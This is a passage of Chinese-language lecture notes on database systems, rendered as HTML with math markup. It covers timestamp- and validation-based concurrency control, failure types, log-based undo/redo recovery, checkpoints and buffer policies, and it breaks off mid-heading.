style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq><ul><li>(1)如果TS(T)&gt;=WT(x)，此读是事实上可实现的<ul><li>如果C(x)为真，同意请求。如果TS(T)&gt;RT(x),置RT(x):=TS(T);否则不改变RT(x)</li><li>如果C(x)为假，推迟T直到C(x)为真或写x的事务终止</li></ul></li><li>(2)如果TS(T)&lt;=WT(x),此读是事实上不可实现的<ul><li>回滚T（过晚的读）</li></ul></li></ul></li><li>假设调度器收到请求<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>w</mi><mi>T</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">w_T(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.0269em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq><ul><li>(1)如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mo>=</mo><mi>R</mi><mi>T</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TS(T)&gt;=RT(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">TS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">RT</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>，且<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mo>=</mo><mi>W</mi><mi>T</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TS(T)&gt;=WT(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">TS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>，此写是事实上可实现的<ul><li>为x写入新值，置<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mi>T</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>:</mo><mo>=</mo><mi>T</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>f</mi><mi>a</mi><mi>l</mi><mi>s</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">WT(x):=TS(T),C(x)=false</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">TS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">se</span></span></span></span></eq></li></ul></li><li>(2)如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mo>=</mo><mi>R</mi><mi>T</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TS(T)&gt;=RT(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">TS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">RT</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>，但是<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>&lt;</mo><mi>W</mi><mi>T</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TS(T)&lt;WT(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">TS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>，此写是事实上可实现的，但x已经有一个更晚的值<ul><li>如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>为真，那么前一个x的写已提交，则忽略T的写</li><li>如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>为假，则我们推迟T，直到<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">C(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>为真或x的事务终止</li></ul></li><li>(3)如果<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>&lt;</mo><mi>R</mi><mi>T</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">TS(T)&lt;RT(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">TS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">RT</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></eq>，此写事实上是不可实现的<ul><li>T必须回滚</li></ul></li></ul></li><li>假设调度器收到提交T的请求<ul><li>它必须找到T所写的所有数据库元素x，并置<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>C</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>:</mo><mo>=</mo><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">C(x):=true</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">:=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">u</span><span class="mord mathnormal">e</span></span></span></span></eq></li><li>如果有任何等待x被提交的事务，这些事务就被允许继续进行</li></ul></li><li>假设调度器收到终止T的请求<ul><li>向前面步骤一样回滚T。</li><li>那么任何等待T所写元素x的事务必须重新读或写，看这一动作现在的T的写被终止后是否合法</li></ul></li></ul><h3 id="2206-%E5%9F%BA%E4%BA%8E%E6%9C%89%E6%95%88%E6%80%A7%E7%A1%AE%E8%AE%A4%E7%9A%84%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6%E6%96%B9%E6%B3%95" tabindex="-1">2206 基于有效性确认的并发控制方法</h3><h4 id="%EF%BC%881%EF%BC%89%E6%80%9D%E6%83%B3" tabindex="-1">（1）思想</h4><ul><li>事务在启动时刻被赋予唯一的时间戳，以示其启动顺序</li><li>为每一个活跃的事务保存其读写数据集合，RS(T):事务T读数据的集合，WS(T):事务T写数据的集合</li><li>通过对多个事务的读写集合，判断是否有冲突，即有效性确认，来完成事务的提交与回滚，强制事务以可串行化的方式执行</li></ul><h4 id="%EF%BC%882%EF%BC%89%E8%B0%83%E5%BA%A6%E5%99%A8%E7%9A%84%E8%BF%90%E8%A1%8C" tabindex="-1">（2）调度器的运行</h4><p>事务分三个阶段进行</p><ul><li>读阶段：事务从数据库中读取读集合中的所有元素，事务还在其局部地址空间计算它将要写的值</li><li>有效性确认阶段：调度器通过比较该事务与其它事务的读写集合来确认该事务的有效性</li><li>写阶段：事务往数据库中写入其写集合元素中的值</li><li>每个成功确认的事务是在其有效性确认的瞬间执行的</li><li>并发事务串行的顺序即事务有效性确认的顺序</li></ul><p>调度器维护三个集合：</p><ul><li>start集合：已经开始但尚未完成有效性确认的事务集合，对此集合中的事务，调度器维护start(T)，即事务T开始的时间</li><li>val集合，已经确认有效性但尚未完成第三阶段写的事务，对此集合中的事务，调度器维护start(T),val(T)，即T确认的时间</li><li>FIN集合，已经完成三阶段的事务，对于这样的事务T，调度器记录start(T),val(T),fin(T),即T的完成时间</li></ul><h4 id="%EF%BC%883%EF%BC%89%E6%9C%89%E6%95%88%E6%80%A7%E7%A1%AE%E8%AE%A4%E7%9A%84%E8%A7%84%E5%88%99" tabindex="-1">（3）有效性确认的规则</h4><ul><li>（1）对于所有已经经过有效性确认，且在T开始前没有完成的U，即对于满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>N</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mi>S</mi><mi>T</mi><mi>A</mi><mi>R</mi><mi>T</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIN(U)&gt;START(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">ST</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.13889em;">RT</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></eq>的U，检测<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>∩</mo><mi>W</mi><mi>S</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">RS(T)\cap WS(U)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">RS</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span></span></span></span></eq>是否为空</li><li>若为空，则确认，否则不予确认</li></ul></li><li>（2）对于所有已经经过有效性确认，且在T有效性确认前没有完成的U，即对于满足<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mi>I</mi><mi>N</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo><mo>&gt;</mo><mi>V</mi><mi>A</mi><mi>L</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">FIN(U)&gt;VAL(T)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord mathnormal">A</span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span></span></span></span></eq>的U，检测<ul><li><eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mi>S</mi><mo stretchy="false">(</mo><mi>T</mi><mo stretchy="false">)</mo><mo>∩</mo><mi>W</mi><mi>S</mi><mo stretchy="false">(</mo><mi>U</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">WS(T)\cap WS(U)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∩</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">U</span><span class="mclose">)</span></span></span></span></eq>是否为空</li><li>若为空，则确认，否则不予确认</li></ul></li></ul><h2 id="%E7%AC%AC%E5%85%AD%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E6%95%85%E9%9A%9C%E5%AF%B9%E7%AD%96" tabindex="-1">第六章 系统故障对策</h2><h3 id="2301-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%95%85%E9%9A%9C%E5%8F%8A%E5%85%B6%E5%BD%B1%E5%93%8D" tabindex="-1">2301 数据库的故障及其影响</h3><h4 id="%EF%BC%881%EF%BC%89%E5%9F%BA%E7%A1%80%E9%9C%80%E8%A6%81%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E7%9A%84" tabindex="-1">（1）基础需要需要知道的</h4><ul><li>DBMS运行方式<ul><li>DBMS利用内存和外存这样的存储体系来进行数据库管理</li><li>在内存中，又分为程序数据和系统数据</li></ul></li><li>事务<ul><li>上一章已经提及</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%95%85%E9%9A%9C%E7%B1%BB%E5%9E%8B" tabindex="-1">（2）数据库的故障类型</h4><ul><li>事务故障<ul><li>某一个程序自身运行错误所引起的故障</li><li>影响该程序本身</li></ul></li><li>系统故障<ul><li>由于掉电，非正常关机等所引起的故障</li><li>影响正在运行的事务以及数据库缓冲区，数据库缓冲区将涉及正在运行和已经运行的事务</li></ul></li><li>介质故障<ul><li>由于介质损坏等引起的故障</li><li>影响是全面的，既影响内存中的数据，也影响介质中的数据</li></ul></li></ul><h3 id="2302-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9B%9E%E5%A4%8D%E7%9A%84%E5%AE%8F%E8%A7%82%E6%80%9D%E8%B7%AF" tabindex="-1">2302 数据库回复的宏观思路</h3><ul><li>数据库故障回复</li><li>把DB由当前不正确状态恢复到已知为正确的某一状态</li><li>需要保证事务的<ul><li>原子性：事务的所有操作，要么全部执行，要不全都不执行</li><li>持久性：已经提交的事务对数据库产生的影响是持久的，未提交的事务对数据库不应该有影响</li></ul></li></ul><h4 id="%EF%BC%881%EF%BC%89%E4%BA%8B%E5%8A%A1%E6%95%85%E9%9A%9C%E7%9A%84%E5%9B%9E%E5%A4%8D" tabindex="-1">（1）事务故障的回复</h4><ul><li>事务故障可以通过重做事务(Redo)和撤销事务(Undo)来恢复。重做事务可保证已经提交事务的持久性，而撤销事务则消除未提交事务的影响。</li></ul><h4 id="%EF%BC%882%EF%BC%89%E7%B3%BB%E7%BB%9F%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D" tabindex="-1">（2）系统故障恢复</h4><p>运行日志：</p><ul><li><p>运行日志是DBMS维护的一个文件，该文件以流水的形式记录乐每一个事务对数据库的每一次操作及操作顺序</p></li><li><p>运行日志直接写入介质存储上，会保持正确性</p></li><li><p>当事务对数据库进行操作时：先写运行日志，写成功后，再与数据库缓冲区进行信息交换</p></li><li><p>系统故障可以通过运行日志来恢复</p><ul><li>按照运行日志记录的事务操作来重做事务（当事务在发生故障时已经正确结束）或撤销事务（当事务在故障发生时未结束）</li></ul></li><li><p>但故障恢复是需要时间的</p><ul><li>运行日志保留了若干天的记录，故障发生时应从哪个点开始恢复呢？</li></ul></li><li><p>DBMS在运行日志中定期的设置和更新检查点</p><ul><li>检查点是这样的时刻：在该时刻，DBMS强制使内存DB Buffer中的内容和介质DB中的保持一致，即将DB Buffer更新的所有内容写回DB</li><li>检查点表征了，在检查点之前内存中数据和介质中数据是保持一致的</li></ul></li><li><p>系统故障的恢复</p><ul><li>检查点之间结束的书屋不需要恢复(已经写回DB)</li><li>检查点之后结束或发生的事务需要依据运行日志进行恢复(不能确定是否写回DB)：故障点前结束的重做，故障点时刻未结束的撤销</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E4%BB%8B%E8%B4%A8%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D" tabindex="-1">（3）介质故障恢复</h4><ul><li><p>副本</p><ul><li>在某一时刻，对数据库在其他介质存储上产生的令一份等同记录</li><li>用副本替代被损坏的数据库</li></ul></li><li><p>介质故障的恢复</p><ul><li>用副本替换被破环的数据库</li><li>由于介质故障影响全面，用副本恢复后还需要根据运行日志进行恢复</li></ul></li><li><p>如何确定备份的时刻：转储点</p><ul><li>过频，影响系统工作效率；过疏，会造成运行日志过大，也影响系统性能</li><li>备份转储周期与运行日志的大小密切相关，应注意防止衔接不畅而引起的漏洞</li></ul></li></ul><h4 id="%EF%BC%884%EF%BC%89%E5%B0%8F%E7%BB%93" tabindex="-1">（4）小结</h4><ul><li>三种类型故障：事务故障，系统故障，介质故障</li><li>三种恢复手段：事务的撤销和重做，运行日志，备份</li><li>两个重要时刻：检查点和转储点</li></ul><h3 id="2303-%E8%BF%90%E8%A1%8C%E6%97%A5%E5%BF%97%E7%9A%84%E6%A6%82%E5%BF%B5" tabindex="-1">2303 运行日志的概念</h3><h4 id="%EF%BC%881%EF%BC%89%E6%97%A5%E5%BF%97%E6%89%80%E8%AE%B0%E5%BD%95%E7%9A%84" tabindex="-1">（1）日志所记录的</h4><ul><li><p>每个事务都会读/写某些元素</p><ul><li>READ(X,t):将元素X读到事务的局部变量t中</li><li>WRITE(X,t):将事务局部变量t写回元素X中</li><li>INPUT(X):将元素X从磁盘读入到内存缓冲区中</li><li>OUTPUT(X):将元素X写回到磁盘中</li></ul></li><li><p>每个事务都以提交或者撤销结束</p><ul><li>COMMIT：事务提交</li><li>ABORT：事务撤销</li></ul></li><li><p>DBMS保证事务的：</p><ul><li>持久性：已提交的事务对数据库产生的影响是持久的，未提交的事务对数据库不应用影响<ul><li>已提交的事务—缓冲区内容保证写回磁盘</li><li>未提交的事务—缓冲区的内容不能影响磁盘</li></ul></li><li>原子性：事务的所有操作，要么全都执行，要么全不执行</li></ul></li></ul><h4 id="%EF%BC%882%EF%BC%89%E4%B8%8D%E5%90%8C%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E7%AD%96%E7%95%A5%E5%BD%B1%E5%93%8D%E4%BA%8B%E5%8A%A1%E7%9A%84%E6%8C%81%E4%B9%85%E6%80%A7" tabindex="-1">（2）不同的缓冲区策略影响事务的持久性</h4><p>缓冲区处理策略</p><ul><li>Force：内存中的数据最晚在commit的时候写入磁盘</li><li>No Steal：不允许事务commit之前把内存中的数据写入磁盘</li><li>No force：内存中的数据可以一直保留，在commit之后过一段时间在写入磁盘(此时在系统崩溃的时候可能还没写入到磁盘，需要redo)—灵活</li><li>Steal：允许事务commit之前把内存中的数据写入磁盘（此时若系统commit之前崩溃时），已经有数据写入到磁盘时，要恢复到崩溃前的状态，需要Undo）—灵活</li></ul><h4 id="%EF%BC%883%EF%BC%89%E4%BA%8B%E5%8A%A1%E6%95%85%E9%9A%9C%E5%BD%B1%E5%93%8D%E4%BA%8B%E5%8A%A1%E7%9A%84%E5%8E%9F%E5%AD%90%E6%80%A7" tabindex="-1">（3）事务故障影响事务的原子性</h4><p>在事务运行时故障，事务会中断，影响原子性</p><h4 id="%EF%BC%884%EF%BC%89%E6%80%8E%E6%A0%B7%E8%AE%B0%E5%BD%95%E6%97%A5%E5%BF%97" tabindex="-1">（4）怎样记录日志</h4><p>日志</p><ul><li>一个包含日志记录的只能追加的顺序文件，不同事务的日志交错存储，按事件发生顺序存储</li><li>发生系统故障时，使用日志进行恢复<ul><li>故障时已提交的事务，重做（Redo）</li><li>故障时未提交的事务，撤销（Undo）</li></ul></li><li>日志记录的信息<ul><li>&lt; Start T  &gt;表明事务T已经开始</li><li>&lt; Commut T &gt;表示事务T已经完成</li><li>&lt; Abort T &gt;事务T未成功，被终止</li><li>&lt; T,x,v1 &gt;或&lt; T,x,v2 &gt;，&lt; T,x,v1,v2 &gt;事务T改变了数据库元素X，X原来的值为v1，新值为v2</li></ul></li><li>三种日志：Undo型日志，Redo型日志，Undo/Redo型日志</li></ul><h4 id="%EF%BC%885%EF%BC%89%E7%BC%93%E5%86%B2%E5%8C%BA%E5%A4%84%E7%90%86%E7%AD%96%E7%95%A5%E5%92%8C%E6%97%A5%E5%BF%97%E6%81%A2%E5%A4%8D%E7%AD%96%E7%95%A5%E7%9A%84%E5%85%B3%E7%B3%BB" tabindex="-1">（5）缓冲区处理策略和日志恢复策略的关系</h4><table><thead><tr><th></th><th>No Steal</th><th>Steal</th></tr></thead><tbody><tr><td>No Force</td><td></td><td>最快</td></tr><tr><td>Force</td><td>最慢</td><td></td></tr></tbody></table><table><thead><tr><th></th><th>No Steal</th><th>Steal</th></tr></thead><tbody><tr><td>No Force</td><td>只需Redo<br>无需Undo</td><td>需要Redo<br>需要Undo</td></tr><tr><td>Force</td><td>无需Redo<br>无需Undo</td><td>无需Redo<br>只需Undo</td></tr></tbody></table><h3 id="2304-undo%E5%9E%8B%E6%97%A5%E5%BF%97%E5%8F%8A%E5%85%B6%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D" tabindex="-1">2304 Undo型日志及其故障恢复</h3><h4 id="%EF%BC%881%EF%BC%89undo%E5%9E%8B%E6%97%A5%E5%BF%97%E7%9A%84%E8%AE%B0%E5%BD%95%E8%A7%84%E5%88%99" tabindex="-1">（1）Undo型日志的记录规则</h4><ul><li>对于任一事务T，按下列顺序像磁盘输出T的日志信息<ul><li>首先&lt;T,x,v&gt;被写入日志中</li><li>其次，OUTPUT(x)</li><li>最后,&lt;COMMIT T&gt; 或&lt;ABORT T&gt;被写入到日志中</li></ul></li><li>注意：undo型日志仅保留旧值。&lt;T,x,v&gt;，v为X原来的值</li><li>Undo型日志：“将事务改变的所有数据写到磁盘前不能提交该事务”</li></ul><h4 id="%EF%BC%882%EF%BC%89%E5%88%A9%E7%94%A8undo%E5%9E%8B%E6%97%A5%E5%BF%97%E8%BF%9B%E8%A1%8C%E6%81%A2%E5%A4%8D" tabindex="-1">（2）利用Undo型日志进行恢复</h4><ul><li>首先，确定每一个事务是否已经完成<ul><li>start T,commit T = yes</li><li>start T,abort T = no（已结束，但未完成）</li><li>start T… = no</li></ul></li><li>然后，从日志的尾部开始按日志记录的反序，处理每一日志记录，撤销未完成事务的所有修改<ul><li>commit T:标记T已完成</li><li>abort T:标记T已经结束但未完成</li><li>T,x,v:如果T未完成，则将X=v写回磁盘，否则跳过</li><li>Start T:跳过</li></ul></li></ul><h4 id="%EF%BC%883%EF%BC%89%E6%A3%80%E6%9F%A5%E7%82%B9%E5%8F%8A%E5%85%B6%E4%BD%BF%E7%94%A8" 